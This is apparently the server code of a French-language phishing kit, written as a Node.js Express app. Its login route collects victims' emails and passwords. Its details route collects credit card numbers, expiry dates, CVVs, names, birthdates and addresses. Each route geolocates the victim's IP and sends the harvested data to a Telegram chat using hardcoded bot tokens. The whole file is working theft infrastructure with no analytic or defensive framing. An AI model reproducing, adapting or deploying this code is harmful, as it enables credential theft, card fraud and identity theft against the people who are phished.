const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');
const http = require('http');
const querystring = require('querystring');

const app = express();
app.use(cors());
const port = 3000;

// Use body-parser middleware to parse request bodies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;
    const ip = req.ip;
    const userAgent = req.headers['user-agent'];

    if(email && password) {
        getIpDetails(ip, (details) => {
            if(details) {
                const message = `🐳 ${details.country} - REZ CONNEXION\n\n📧 Email: ${email}\n🔑 Mdp: ${password}\n\n🗺️ Adresse IP : ${ip}\n🌏 Pays : ${details.country}\n🚩 Ville : ${details.city}\n📡 Isp Provider : ${details.isp}\n\n⚙️ User-Agent: ${userAgent}`;
                sendToTelegramLogin(message);
                res.status(200).send('Login credentials sent successfully!');
            } else {
                res.status(500).send('Unable to retrieve IP details.');
            }
        });
    } else {
        res.status(400).send('Bad request: Email or password not provided.');
    }
});

app.post('/details', (req, res) => {
    const {
        cartecredit,
        cartedate,
        cartecvv,
        lastname,
        firstname,
        birthdate,
        number,
        address,
        city,
        postalcode
    } = req.body;

    const ip = req.ip;
    const userAgent = req.headers['user-agent'];

    if(cartecredit && cartedate && cartecvv && lastname && firstname && birthdate && number && address && city && postalcode) {
        getIpDetails(ip, (details) => {
            if(details) {
                const message = `Credit Card: ${cartecredit}, Date: ${cartedate}, CVV: ${cartecvv}, Last Name: ${lastname}, First Name: ${firstname}, Birth Date: ${birthdate}, Number: ${number}, Address: ${address}, City: ${city}, Postal Code: ${postalcode}\n\n🗺️ Adresse IP : ${ip}\n🌏 Pays : ${details.country}\n🚩 Ville : ${details.city}\n📡 Isp Provider : ${details.isp}\n\n⚙️ User-Agent: ${userAgent}`;
                sendToTelegramDetail(message);
                res.status(200).send('Details sent successfully!');
            } else {
                res.status(500).send('Unable to retrieve IP details.');
            }
        });
    } else {
        res.status(400).send('Bad request: Some details not provided.');
    }
});

app.listen(port, () => {
    console.log(`App is listening at http://localhost:${port}`);
});


// Appel pour IP API JSON

function getIpDetails(ip, callback) {
    http.get(`http://ip-api.com/json/${ip}`, (res) => {
        let data = '';

        res.on('data', (chunk) => {
            data += chunk;
        });

        res.on('end', () => {
            callback(JSON.parse(data));
        });
    }).on('error', (err) => {
        console.log('Error: ' + err.message);
        callback(null);
    });
}

// Code Telegram Login Email

function sendToTelegramLogin(message) {
    const botToken = '6240231033:AAGdksy6YRV4AjCc_d73L-chN1YI7R7j0zg';
    const chatId = '782943823';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const data = querystring.stringify({
        chat_id: chatId,
        text: message,
    });

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': data.length,
        },
    };

    const req = https.request(url, options, (res) => {
        console.log(`statusCode: ${res.statusCode}`);
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (error) => {
        console.error(error);
    });

    req.write(data);
    req.end();
}

// Code Telegram Details Carte de Credit

function sendToTelegramDetail(message) {
    const botToken = '6114193428:AAEiI79QVGqBxve9Acktycg2juppz0H1olk';
    const chatId = '782943823';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const data = querystring.stringify({
        chat_id: chatId,
        text: message,
    });

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': data.length,
        },
    };

    const req = https.request(url, options, (res) => {
        console.log(`statusCode: ${res.statusCode}`);
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (error) => {
        console.error(error);
    });

    req.write(data);
    req.end();
}
